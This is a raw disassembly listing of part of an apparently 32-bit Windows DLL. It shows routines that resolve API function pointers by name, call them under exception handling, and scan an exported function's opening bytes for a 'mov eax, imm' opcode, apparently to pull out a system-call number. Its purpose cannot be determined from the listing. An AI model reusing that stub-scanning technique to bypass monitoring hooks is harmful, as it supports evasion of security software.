1000c1e6:	e8 69 02 00 00       	call   0x1000c454
1000c1eb:	83 c4 10             	add    $0x10,%esp
1000c1ee:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000c1f1:	3b c3                	cmp    %ebx,%eax
1000c1f3:	74 1f                	je     0x1000c214
1000c1f5:	6a ff                	push   $0xffffffff
1000c1f7:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000c1fa:	50                   	push   %eax
1000c1fb:	e8 d6 12 00 00       	call   0x1000d4d6
1000c200:	59                   	pop    %ecx
1000c201:	59                   	pop    %ecx
1000c202:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000c205:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000c208:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000c20f:	5f                   	pop    %edi
1000c210:	5e                   	pop    %esi
1000c211:	5b                   	pop    %ebx
1000c212:	c9                   	leave
1000c213:	c3                   	ret
1000c214:	8b 07                	mov    (%edi),%eax
1000c216:	8d 04 b0             	lea    (%eax,%esi,4),%eax
1000c219:	03 45 10             	add    0x10(%ebp),%eax
1000c21c:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
1000c21f:	89 01                	mov    %eax,(%ecx)
1000c221:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000c225:	e8 02 00 00 00       	call   0x1000c22c
1000c22a:	eb d6                	jmp    0x1000c202
1000c22c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1000c22f:	50                   	push   %eax
1000c230:	e8 dd 06 00 00       	call   0x1000c912
1000c235:	59                   	pop    %ecx
1000c236:	c3                   	ret
1000c237:	55                   	push   %ebp
1000c238:	8b ec                	mov    %esp,%ebp
1000c23a:	53                   	push   %ebx
1000c23b:	8b 5d 10             	mov    0x10(%ebp),%ebx
1000c23e:	56                   	push   %esi
1000c23f:	8b 75 0c             	mov    0xc(%ebp),%esi
1000c242:	57                   	push   %edi
1000c243:	bf 00 01 00 00       	mov    $0x100,%edi
1000c248:	53                   	push   %ebx
1000c249:	57                   	push   %edi
1000c24a:	68 a4 01 00 00       	push   $0x1a4
1000c24f:	68 e4 e6 00 10       	push   $0x1000e6e4
1000c254:	ff 36                	push   (%esi)
1000c256:	6a 5c                	push   $0x5c
1000c258:	ff 75 14             	push   0x14(%ebp)
1000c25b:	ff 75 08             	push   0x8(%ebp)
1000c25e:	e8 04 01 00 00       	call   0x1000c367
1000c263:	83 c4 20             	add    $0x20,%esp
1000c266:	85 c0                	test   %eax,%eax
1000c268:	0f 8c f4 00 00 00    	jl     0x1000c362
1000c26e:	74 57                	je     0x1000c2c7
1000c270:	53                   	push   %ebx
1000c271:	57                   	push   %edi
1000c272:	68 a1 01 00 00       	push   $0x1a1
1000c277:	68 88 e8 00 10       	push   $0x1000e888
1000c27c:	ff 36                	push   (%esi)
1000c27e:	6a 5c                	push   $0x5c
1000c280:	ff 75 14             	push   0x14(%ebp)
1000c283:	ff 75 08             	push   0x8(%ebp)
1000c286:	e8 dc 00 00 00       	call   0x1000c367
1000c28b:	83 c4 20             	add    $0x20,%esp
1000c28e:	85 c0                	test   %eax,%eax
1000c290:	0f 8c cc 00 00 00    	jl     0x1000c362
1000c296:	74 2f                	je     0x1000c2c7
1000c298:	53                   	push   %ebx
1000c299:	57                   	push   %edi
1000c29a:	68 1a 01 00 00       	push   $0x11a
1000c29f:	68 2c ea 00 10       	push   $0x1000ea2c
1000c2a4:	ff 36                	push   (%esi)
1000c2a6:	6a 5c                	push   $0x5c
1000c2a8:	ff 75 14             	push   0x14(%ebp)
1000c2ab:	ff 75 08             	push   0x8(%ebp)
1000c2ae:	e8 b4 00 00 00       	call   0x1000c367
1000c2b3:	83 c4 20             	add    $0x20,%esp
1000c2b6:	85 c0                	test   %eax,%eax
1000c2b8:	0f 8c a4 00 00 00    	jl     0x1000c362
1000c2be:	74 07                	je     0x1000c2c7
1000c2c0:	6a f3                	push   $0xfffffff3
1000c2c2:	e9 96 00 00 00       	jmp    0x1000c35d
1000c2c7:	bf 2c 01 00 00       	mov    $0x12c,%edi
1000c2cc:	53                   	push   %ebx
1000c2cd:	57                   	push   %edi
1000c2ce:	68 d9 00 00 00       	push   $0xd9
1000c2d3:	68 48 eb 00 10       	push   $0x1000eb48
1000c2d8:	ff 36                	push   (%esi)
1000c2da:	6a 50                	push   $0x50
1000c2dc:	ff 75 18             	push   0x18(%ebp)
1000c2df:	ff 75 08             	push   0x8(%ebp)
1000c2e2:	e8 80 00 00 00       	call   0x1000c367
1000c2e7:	83 c4 20             	add    $0x20,%esp
1000c2ea:	85 c0                	test   %eax,%eax
1000c2ec:	7c 74                	jl     0x1000c362
1000c2ee:	74 70                	je     0x1000c360
1000c2f0:	53                   	push   %ebx
1000c2f1:	57                   	push   %edi
1000c2f2:	68 eb 00 00 00       	push   $0xeb
1000c2f7:	68 24 ec 00 10       	push   $0x1000ec24
1000c2fc:	ff 36                	push   (%esi)
1000c2fe:	6a 50                	push   $0x50
1000c300:	ff 75 18             	push   0x18(%ebp)
1000c303:	ff 75 08             	push   0x8(%ebp)
1000c306:	e8 5c 00 00 00       	call   0x1000c367
1000c30b:	83 c4 20             	add    $0x20,%esp
1000c30e:	85 c0                	test   %eax,%eax
1000c310:	7c 50                	jl     0x1000c362
1000c312:	74 4c                	je     0x1000c360
1000c314:	53                   	push   %ebx
1000c315:	bb d4 00 00 00       	mov    $0xd4,%ebx
1000c31a:	57                   	push   %edi
1000c31b:	53                   	push   %ebx
1000c31c:	68 10 ed 00 10       	push   $0x1000ed10
1000c321:	ff 36                	push   (%esi)
1000c323:	6a 50                	push   $0x50
1000c325:	ff 75 18             	push   0x18(%ebp)
1000c328:	ff 75 08             	push   0x8(%ebp)
1000c32b:	e8 37 00 00 00       	call   0x1000c367
1000c330:	83 c4 20             	add    $0x20,%esp
1000c333:	85 c0                	test   %eax,%eax
1000c335:	7c 2b                	jl     0x1000c362
1000c337:	74 27                	je     0x1000c360
1000c339:	ff 75 10             	push   0x10(%ebp)
1000c33c:	57                   	push   %edi
1000c33d:	53                   	push   %ebx
1000c33e:	68 e4 ed 00 10       	push   $0x1000ede4
1000c343:	ff 36                	push   (%esi)
1000c345:	6a 50                	push   $0x50
1000c347:	ff 75 18             	push   0x18(%ebp)
1000c34a:	ff 75 08             	push   0x8(%ebp)
1000c34d:	e8 15 00 00 00       	call   0x1000c367
1000c352:	83 c4 20             	add    $0x20,%esp
1000c355:	85 c0                	test   %eax,%eax
1000c357:	7c 09                	jl     0x1000c362
1000c359:	74 05                	je     0x1000c360
1000c35b:	6a f2                	push   $0xfffffff2
1000c35d:	58                   	pop    %eax
1000c35e:	eb 02                	jmp    0x1000c362
1000c360:	33 c0                	xor    %eax,%eax
1000c362:	5f                   	pop    %edi
1000c363:	5e                   	pop    %esi
1000c364:	5b                   	pop    %ebx
1000c365:	5d                   	pop    %ebp
1000c366:	c3                   	ret
1000c367:	55                   	push   %ebp
1000c368:	8b ec                	mov    %esp,%ebp
1000c36a:	ff 75 24             	push   0x24(%ebp)
1000c36d:	ff 75 20             	push   0x20(%ebp)
1000c370:	ff 75 1c             	push   0x1c(%ebp)
1000c373:	ff 75 18             	push   0x18(%ebp)
1000c376:	ff 75 14             	push   0x14(%ebp)
1000c379:	ff 75 08             	push   0x8(%ebp)
1000c37c:	e8 4f 00 00 00       	call   0x1000c3d0
1000c381:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000c384:	83 c4 18             	add    $0x18,%esp
1000c387:	85 c9                	test   %ecx,%ecx
1000c389:	89 01                	mov    %eax,(%ecx)
1000c38b:	7d 04                	jge    0x1000c391
1000c38d:	8b c1                	mov    %ecx,%eax
1000c38f:	5d                   	pop    %ebp
1000c390:	c3                   	ret
1000c391:	8d 4d 20             	lea    0x20(%ebp),%ecx
1000c394:	51                   	push   %ecx
1000c395:	50                   	push   %eax
1000c396:	ff 75 14             	push   0x14(%ebp)
1000c399:	ff 75 08             	push   0x8(%ebp)
1000c39c:	e8 b3 00 00 00       	call   0x1000c454
1000c3a1:	83 c4 10             	add    $0x10,%esp
1000c3a4:	85 c0                	test   %eax,%eax
1000c3a6:	75 26                	jne    0x1000c3ce
1000c3a8:	ff 75 1c             	push   0x1c(%ebp)
1000c3ab:	8b 45 20             	mov    0x20(%ebp),%eax
1000c3ae:	2b 45 24             	sub    0x24(%ebp),%eax
1000c3b1:	ff 75 18             	push   0x18(%ebp)
1000c3b4:	50                   	push   %eax
1000c3b5:	ff 75 08             	push   0x8(%ebp)
1000c3b8:	e8 ca 07 00 00       	call   0x1000cb87
1000c3bd:	6b c0 64             	imul   $0x64,%eax,%eax
1000c3c0:	99                   	cltd
1000c3c1:	f7 7d 1c             	idivl  0x1c(%ebp)
1000c3c4:	83 c4 10             	add    $0x10,%esp
1000c3c7:	3b 45 10             	cmp    0x10(%ebp),%eax
1000c3ca:	7c 02                	jl     0x1000c3ce
1000c3cc:	33 c0                	xor    %eax,%eax
1000c3ce:	5d                   	pop    %ebp
1000c3cf:	c3                   	ret
1000c3d0:	55                   	push   %ebp
1000c3d1:	8b ec                	mov    %esp,%ebp
1000c3d3:	51                   	push   %ecx
1000c3d4:	51                   	push   %ecx
1000c3d5:	8b 45 18             	mov    0x18(%ebp),%eax
1000c3d8:	53                   	push   %ebx
1000c3d9:	56                   	push   %esi
1000c3da:	8b 75 0c             	mov    0xc(%ebp),%esi
1000c3dd:	57                   	push   %edi
1000c3de:	33 db                	xor    %ebx,%ebx
1000c3e0:	8d 3c 86             	lea    (%esi,%eax,4),%edi
1000c3e3:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000c3e6:	3b f7                	cmp    %edi,%esi
1000c3e8:	89 5d f8             	mov    %ebx,-0x8(%ebp)
1000c3eb:	89 75 0c             	mov    %esi,0xc(%ebp)
1000c3ee:	73 52                	jae    0x1000c442
1000c3f0:	8d 45 18             	lea    0x18(%ebp),%eax
1000c3f3:	6a 04                	push   $0x4
1000c3f5:	50                   	push   %eax
1000c3f6:	ff 75 0c             	push   0xc(%ebp)
1000c3f9:	ff 75 08             	push   0x8(%ebp)
1000c3fc:	e8 09 06 00 00       	call   0x1000ca0a
1000c401:	83 c4 10             	add    $0x10,%esp
1000c404:	84 c0                	test   %al,%al
1000c406:	74 47                	je     0x1000c44f
1000c408:	ff 75 14             	push   0x14(%ebp)
1000c40b:	8b 45 18             	mov    0x18(%ebp),%eax
1000c40e:	2b 45 1c             	sub    0x1c(%ebp),%eax
1000c411:	ff 75 10             	push   0x10(%ebp)
1000c414:	50                   	push   %eax
1000c415:	ff 75 08             	push   0x8(%ebp)
1000c418:	e8 6a 07 00 00       	call   0x1000cb87
1000c41d:	83 c4 10             	add    $0x10,%esp
1000c420:	3b c3                	cmp    %ebx,%eax
1000c422:	7c 0d                	jl     0x1000c431
1000c424:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000c427:	8b d8                	mov    %eax,%ebx
1000c429:	8b 45 0c             	mov    0xc(%ebp),%eax
1000c42c:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000c42f:	eb 08                	jmp    0x1000c439
1000c431:	3b 45 fc             	cmp    -0x4(%ebp),%eax
1000c434:	7c 03                	jl     0x1000c439
1000c436:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000c439:	83 45 0c 04          	addl   $0x4,0xc(%ebp)
1000c43d:	39 7d 0c             	cmp    %edi,0xc(%ebp)
1000c440:	72 ae                	jb     0x1000c3f0
1000c442:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000c445:	2b c6                	sub    %esi,%eax
1000c447:	c1 e8 02             	shr    $0x2,%eax
1000c44a:	5f                   	pop    %edi
1000c44b:	5e                   	pop    %esi
1000c44c:	5b                   	pop    %ebx
1000c44d:	c9                   	leave
1000c44e:	c3                   	ret
1000c44f:	6a fc                	push   $0xfffffffc
1000c451:	58                   	pop    %eax
1000c452:	eb f6                	jmp    0x1000c44a
1000c454:	8b 44 24 0c          	mov    0xc(%esp),%eax
1000c458:	8b 4c 24 08          	mov    0x8(%esp),%ecx
1000c45c:	6a 04                	push   $0x4
1000c45e:	ff 74 24 14          	push   0x14(%esp)
1000c462:	8d 04 81             	lea    (%ecx,%eax,4),%eax
1000c465:	50                   	push   %eax
1000c466:	ff 74 24 10          	push   0x10(%esp)
1000c46a:	e8 9b 05 00 00       	call   0x1000ca0a
1000c46f:	83 c4 10             	add    $0x10,%esp
1000c472:	f6 d8                	neg    %al
1000c474:	1b c0                	sbb    %eax,%eax
1000c476:	83 e0 04             	and    $0x4,%eax
1000c479:	83 c0 fc             	add    $0xfffffffc,%eax
1000c47c:	c3                   	ret
1000c47d:	ff 74 24 0c          	push   0xc(%esp)
1000c481:	ff 74 24 0c          	push   0xc(%esp)
1000c485:	ff 74 24 0c          	push   0xc(%esp)
1000c489:	e8 28 06 00 00       	call   0x1000cab6
1000c48e:	83 c4 0c             	add    $0xc,%esp
1000c491:	c3                   	ret
1000c492:	55                   	push   %ebp
1000c493:	8b ec                	mov    %esp,%ebp
1000c495:	6a ff                	push   $0xffffffff
1000c497:	68 e0 ee 00 10       	push   $0x1000eee0
1000c49c:	68 00 c6 00 10       	push   $0x1000c600
1000c4a1:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000c4a7:	50                   	push   %eax
1000c4a8:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000c4af:	83 ec 2c             	sub    $0x2c,%esp
1000c4b2:	53                   	push   %ebx
1000c4b3:	56                   	push   %esi
1000c4b4:	57                   	push   %edi
1000c4b5:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000c4b8:	68 e4 06 01 10       	push   $0x100106e4
1000c4bd:	8b 75 08             	mov    0x8(%ebp),%esi
1000c4c0:	56                   	push   %esi
1000c4c1:	e8 a3 d6 ff ff       	call   0x10009b69
1000c4c6:	8b f8                	mov    %eax,%edi
1000c4c8:	68 d8 06 01 10       	push   $0x100106d8
1000c4cd:	56                   	push   %esi
1000c4ce:	e8 96 d6 ff ff       	call   0x10009b69
1000c4d3:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000c4d6:	68 bc 06 01 10       	push   $0x100106bc
1000c4db:	56                   	push   %esi
1000c4dc:	e8 88 d6 ff ff       	call   0x10009b69
1000c4e1:	89 45 c4             	mov    %eax,-0x3c(%ebp)
1000c4e4:	68 9c 06 01 10       	push   $0x1001069c
1000c4e9:	56                   	push   %esi
1000c4ea:	e8 7a d6 ff ff       	call   0x10009b69
1000c4ef:	89 45 cc             	mov    %eax,-0x34(%ebp)
1000c4f2:	68 88 06 01 10       	push   $0x10010688
1000c4f7:	56                   	push   %esi
1000c4f8:	e8 6c d6 ff ff       	call   0x10009b69
1000c4fd:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000c500:	68 78 06 01 10       	push   $0x10010678
1000c505:	56                   	push   %esi
1000c506:	e8 5e d6 ff ff       	call   0x10009b69
1000c50b:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000c50e:	68 64 06 01 10       	push   $0x10010664
1000c513:	56                   	push   %esi
1000c514:	e8 50 d6 ff ff       	call   0x10009b69
1000c519:	83 c4 38             	add    $0x38,%esp
1000c51c:	89 45 c8             	mov    %eax,-0x38(%ebp)
1000c51f:	33 db                	xor    %ebx,%ebx
1000c521:	3b fb                	cmp    %ebx,%edi
1000c523:	0f 84 c1 00 00 00    	je     0x1000c5ea
1000c529:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
1000c52c:	0f 84 b8 00 00 00    	je     0x1000c5ea
1000c532:	39 5d c4             	cmp    %ebx,-0x3c(%ebp)
1000c535:	0f 84 af 00 00 00    	je     0x1000c5ea
1000c53b:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
1000c53e:	0f 84 a6 00 00 00    	je     0x1000c5ea
1000c544:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
1000c547:	0f 84 9d 00 00 00    	je     0x1000c5ea
1000c54d:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
1000c550:	0f 84 94 00 00 00    	je     0x1000c5ea
1000c556:	3b c3                	cmp    %ebx,%eax
1000c558:	0f 84 8c 00 00 00    	je     0x1000c5ea
1000c55e:	53                   	push   %ebx
1000c55f:	53                   	push   %ebx
1000c560:	53                   	push   %ebx
1000c561:	ff 75 14             	push   0x14(%ebp)
1000c564:	ff 75 0c             	push   0xc(%ebp)
1000c567:	ff d7                	call   *%edi
1000c569:	8b f0                	mov    %eax,%esi
1000c56b:	89 75 d0             	mov    %esi,-0x30(%ebp)
1000c56e:	3b f3                	cmp    %ebx,%esi
1000c570:	75 04                	jne    0x1000c576
1000c572:	6a b8                	push   $0xffffffb8
1000c574:	eb 76                	jmp    0x1000c5ec
1000c576:	38 5d 18             	cmp    %bl,0x18(%ebp)
1000c579:	74 24                	je     0x1000c59f
1000c57b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000c57e:	53                   	push   %ebx
1000c57f:	53                   	push   %ebx
1000c580:	56                   	push   %esi
1000c581:	ff 55 dc             	call   *-0x24(%ebp)
1000c584:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000c588:	eb 19                	jmp    0x1000c5a3
1000c58a:	6a 01                	push   $0x1
1000c58c:	58                   	pop    %eax
1000c58d:	c3                   	ret
1000c58e:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000c591:	ff 75 d0             	push   -0x30(%ebp)
1000c594:	ff 55 d4             	call   *-0x2c(%ebp)
1000c597:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000c59b:	6a b7                	push   $0xffffffb7
1000c59d:	eb 4d                	jmp    0x1000c5ec
1000c59f:	56                   	push   %esi
1000c5a0:	ff 55 c4             	call   *-0x3c(%ebp)
1000c5a3:	80 4e 07 20          	orb    $0x20,0x7(%esi)
1000c5a7:	53                   	push   %ebx
1000c5a8:	53                   	push   %ebx
1000c5a9:	53                   	push   %ebx
1000c5aa:	6a 01                	push   $0x1
1000c5ac:	53                   	push   %ebx
1000c5ad:	56                   	push   %esi
1000c5ae:	ff 55 cc             	call   *-0x34(%ebp)
1000c5b1:	8b f8                	mov    %eax,%edi
1000c5b3:	3b fb                	cmp    %ebx,%edi
1000c5b5:	75 0e                	jne    0x1000c5c5
1000c5b7:	38 5d 18             	cmp    %bl,0x18(%ebp)
1000c5ba:	74 04                	je     0x1000c5c0
1000c5bc:	56                   	push   %esi
1000c5bd:	ff 55 e0             	call   *-0x20(%ebp)
1000c5c0:	6a b7                	push   $0xffffffb7
1000c5c2:	5b                   	pop    %ebx
1000c5c3:	eb 1d                	jmp    0x1000c5e2
1000c5c5:	ff 75 14             	push   0x14(%ebp)
1000c5c8:	ff 75 10             	push   0x10(%ebp)
1000c5cb:	57                   	push   %edi
1000c5cc:	e8 4b 0d 00 00       	call   0x1000d31c
1000c5d1:	83 c4 0c             	add    $0xc,%esp
1000c5d4:	56                   	push   %esi
1000c5d5:	57                   	push   %edi
1000c5d6:	ff 55 c8             	call   *-0x38(%ebp)
1000c5d9:	38 5d 18             	cmp    %bl,0x18(%ebp)
1000c5dc:	74 04                	je     0x1000c5e2
1000c5de:	56                   	push   %esi
1000c5df:	ff 55 e0             	call   *-0x20(%ebp)
1000c5e2:	56                   	push   %esi
1000c5e3:	ff 55 d4             	call   *-0x2c(%ebp)
1000c5e6:	8b c3                	mov    %ebx,%eax
1000c5e8:	eb 03                	jmp    0x1000c5ed
1000c5ea:	6a 01                	push   $0x1
1000c5ec:	58                   	pop    %eax
1000c5ed:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000c5f0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000c5f7:	5f                   	pop    %edi
1000c5f8:	5e                   	pop    %esi
1000c5f9:	5b                   	pop    %ebx
1000c5fa:	c9                   	leave
1000c5fb:	c3                   	ret
1000c5fc:	cc                   	int3
1000c5fd:	cc                   	int3
1000c5fe:	cc                   	int3
1000c5ff:	cc                   	int3
1000c600:	55                   	push   %ebp
1000c601:	8b ec                	mov    %esp,%ebp
1000c603:	53                   	push   %ebx
1000c604:	56                   	push   %esi
1000c605:	57                   	push   %edi
1000c606:	83 3d 3c 08 01 10 00 	cmpl   $0x0,0x1001083c
1000c60d:	75 17                	jne    0x1000c626
1000c60f:	6a 00                	push   $0x0
1000c611:	e8 2a 00 00 00       	call   0x1000c640
1000c616:	83 c4 04             	add    $0x4,%esp
1000c619:	83 3d 3c 08 01 10 00 	cmpl   $0x0,0x1001083c
1000c620:	75 04                	jne    0x1000c626
1000c622:	33 c0                	xor    %eax,%eax
1000c624:	eb 0b                	jmp    0x1000c631
1000c626:	8b e5                	mov    %ebp,%esp
1000c628:	5d                   	pop    %ebp
1000c629:	ff 25 3c 08 01 10    	jmp    *0x1001083c
1000c62f:	33 c0                	xor    %eax,%eax
1000c631:	5f                   	pop    %edi
1000c632:	5e                   	pop    %esi
1000c633:	5b                   	pop    %ebx
1000c634:	5d                   	pop    %ebp
1000c635:	c3                   	ret
1000c636:	cc                   	int3
1000c637:	cc                   	int3
1000c638:	cc                   	int3
1000c639:	cc                   	int3
1000c63a:	cc                   	int3
1000c63b:	cc                   	int3
1000c63c:	cc                   	int3
1000c63d:	cc                   	int3
1000c63e:	cc                   	int3
1000c63f:	cc                   	int3
1000c640:	8b 44 24 04          	mov    0x4(%esp),%eax
1000c644:	85 c0                	test   %eax,%eax
1000c646:	75 23                	jne    0x1000c66b
1000c648:	68 40 05 01 10       	push   $0x10010540
1000c64d:	68 f4 06 01 10       	push   $0x100106f4
1000c652:	ff 15 f4 e0 00 10    	call   *0x1000e0f4
1000c658:	50                   	push   %eax
1000c659:	ff 15 1c e1 00 10    	call   *0x1000e11c
1000c65f:	85 c0                	test   %eax,%eax
1000c661:	a3 3c 08 01 10       	mov    %eax,0x1001083c
1000c666:	75 08                	jne    0x1000c670
1000c668:	32 c0                	xor    %al,%al
1000c66a:	c3                   	ret
1000c66b:	a3 3c 08 01 10       	mov    %eax,0x1001083c
1000c670:	b0 01                	mov    $0x1,%al
1000c672:	c3                   	ret
1000c673:	90                   	nop
1000c674:	90                   	nop
1000c675:	90                   	nop
1000c676:	90                   	nop
1000c677:	90                   	nop
1000c678:	90                   	nop
1000c679:	90                   	nop
1000c67a:	90                   	nop
1000c67b:	90                   	nop
1000c67c:	90                   	nop
1000c67d:	90                   	nop
1000c67e:	90                   	nop
1000c67f:	90                   	nop
1000c680:	55                   	push   %ebp
1000c681:	8b ec                	mov    %esp,%ebp
1000c683:	6a ff                	push   $0xffffffff
1000c685:	68 f0 ee 00 10       	push   $0x1000eef0
1000c68a:	68 00 c6 00 10       	push   $0x1000c600
1000c68f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000c695:	50                   	push   %eax
1000c696:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000c69d:	83 ec 1c             	sub    $0x1c,%esp
1000c6a0:	53                   	push   %ebx
1000c6a1:	56                   	push   %esi
1000c6a2:	57                   	push   %edi
1000c6a3:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000c6a6:	33 db                	xor    %ebx,%ebx
1000c6a8:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
1000c6ab:	89 5d e0             	mov    %ebx,-0x20(%ebp)
1000c6ae:	53                   	push   %ebx
1000c6af:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000c6b2:	50                   	push   %eax
1000c6b3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000c6b6:	50                   	push   %eax
1000c6b7:	53                   	push   %ebx
1000c6b8:	6a 03                	push   $0x3
1000c6ba:	e8 28 01 00 00       	call   0x1000c7e7
1000c6bf:	83 c4 14             	add    $0x14,%esp
1000c6c2:	84 c0                	test   %al,%al
1000c6c4:	74 7e                	je     0x1000c744
1000c6c6:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
1000c6c9:	74 6f                	je     0x1000c73a
1000c6cb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000c6ce:	8d 70 04             	lea    0x4(%eax),%esi
1000c6d1:	33 ff                	xor    %edi,%edi
1000c6d3:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000c6d6:	3b 38                	cmp    (%eax),%edi
1000c6d8:	73 60                	jae    0x1000c73a
1000c6da:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000c6dd:	68 fc 06 01 10       	push   $0x100106fc
1000c6e2:	ff 76 04             	push   0x4(%esi)
1000c6e5:	ff 15 94 e1 00 10    	call   *0x1000e194
1000c6eb:	59                   	pop    %ecx
1000c6ec:	59                   	pop    %ecx
1000c6ed:	85 c0                	test   %eax,%eax
1000c6ef:	75 04                	jne    0x1000c6f5
1000c6f1:	b3 01                	mov    $0x1,%bl
1000c6f3:	eb 33                	jmp    0x1000c728
1000c6f5:	ff 76 04             	push   0x4(%esi)
1000c6f8:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000c6fe:	59                   	pop    %ecx
1000c6ff:	8b 4e 04             	mov    0x4(%esi),%ecx
1000c702:	8d 74 41 02          	lea    0x2(%ecx,%eax,2),%esi
1000c706:	89 75 dc             	mov    %esi,-0x24(%ebp)
1000c709:	89 75 d4             	mov    %esi,-0x2c(%ebp)
1000c70c:	8b c6                	mov    %esi,%eax
1000c70e:	83 e0 03             	and    $0x3,%eax
1000c711:	74 05                	je     0x1000c718
1000c713:	03 f0                	add    %eax,%esi
1000c715:	89 75 dc             	mov    %esi,-0x24(%ebp)
1000c718:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000c71c:	47                   	inc    %edi
1000c71d:	eb b4                	jmp    0x1000c6d3
1000c71f:	6a 01                	push   $0x1
1000c721:	58                   	pop    %eax
1000c722:	c3                   	ret
1000c723:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000c726:	32 db                	xor    %bl,%bl
1000c728:	ff 75 e4             	push   -0x1c(%ebp)
1000c72b:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000c731:	59                   	pop    %ecx
1000c732:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000c736:	8a c3                	mov    %bl,%al
1000c738:	eb 0c                	jmp    0x1000c746
1000c73a:	ff 75 e4             	push   -0x1c(%ebp)
1000c73d:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000c743:	59                   	pop    %ecx
1000c744:	32 c0                	xor    %al,%al
1000c746:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000c749:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000c750:	5f                   	pop    %edi
1000c751:	5e                   	pop    %esi
1000c752:	5b                   	pop    %ebx
1000c753:	c9                   	leave
1000c754:	c3                   	ret
1000c755:	55                   	push   %ebp
1000c756:	8b ec                	mov    %esp,%ebp
1000c758:	6a ff                	push   $0xffffffff
1000c75a:	68 00 ef 00 10       	push   $0x1000ef00
1000c75f:	68 00 c6 00 10       	push   $0x1000c600
1000c764:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000c76a:	50                   	push   %eax
1000c76b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000c772:	83 ec 18             	sub    $0x18,%esp
1000c775:	53                   	push   %ebx
1000c776:	56                   	push   %esi
1000c777:	57                   	push   %edi
1000c778:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000c77b:	33 db                	xor    %ebx,%ebx
1000c77d:	39 5d 08             	cmp    %ebx,0x8(%ebp)
1000c780:	74 54                	je     0x1000c7d6
1000c782:	68 40 03 01 10       	push   $0x10010340
1000c787:	ff 15 f4 e0 00 10    	call   *0x1000e0f4
1000c78d:	ff 75 08             	push   0x8(%ebp)
1000c790:	50                   	push   %eax
1000c791:	ff 15 1c e1 00 10    	call   *0x1000e11c
1000c797:	3b c3                	cmp    %ebx,%eax
1000c799:	74 3b                	je     0x1000c7d6
1000c79b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000c79e:	89 5d dc             	mov    %ebx,-0x24(%ebp)
1000c7a1:	83 7d dc 0a          	cmpl   $0xa,-0x24(%ebp)
1000c7a5:	7d 2b                	jge    0x1000c7d2
1000c7a7:	80 38 b8             	cmpb   $0xb8,(%eax)
1000c7aa:	75 16                	jne    0x1000c7c2
1000c7ac:	38 58 03             	cmp    %bl,0x3(%eax)
1000c7af:	75 11                	jne    0x1000c7c2
1000c7b1:	38 58 04             	cmp    %bl,0x4(%eax)
1000c7b4:	75 0c                	jne    0x1000c7c2
1000c7b6:	40                   	inc    %eax
1000c7b7:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000c7ba:	8b 00                	mov    (%eax),%eax
1000c7bc:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000c7c0:	eb 16                	jmp    0x1000c7d8
1000c7c2:	40                   	inc    %eax
1000c7c3:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000c7c6:	ff 45 dc             	incl   -0x24(%ebp)
1000c7c9:	eb d6                	jmp    0x1000c7a1
1000c7cb:	6a 01                	push   $0x1
1000c7cd:	58                   	pop    %eax
1000c7ce:	c3                   	ret
1000c7cf:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000c7d2:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000c7d6:	33 c0                	xor    %eax,%eax
1000c7d8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000c7db:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000c7e2:	5f                   	pop    %edi
1000c7e3:	5e                   	pop    %esi
1000c7e4:	5b                   	pop    %ebx
1000c7e5:	c9                   	leave
1000c7e6:	c3                   	ret
1000c7e7:	55                   	push   %ebp
1000c7e8:	8b ec                	mov    %esp,%ebp
1000c7ea:	51                   	push   %ecx
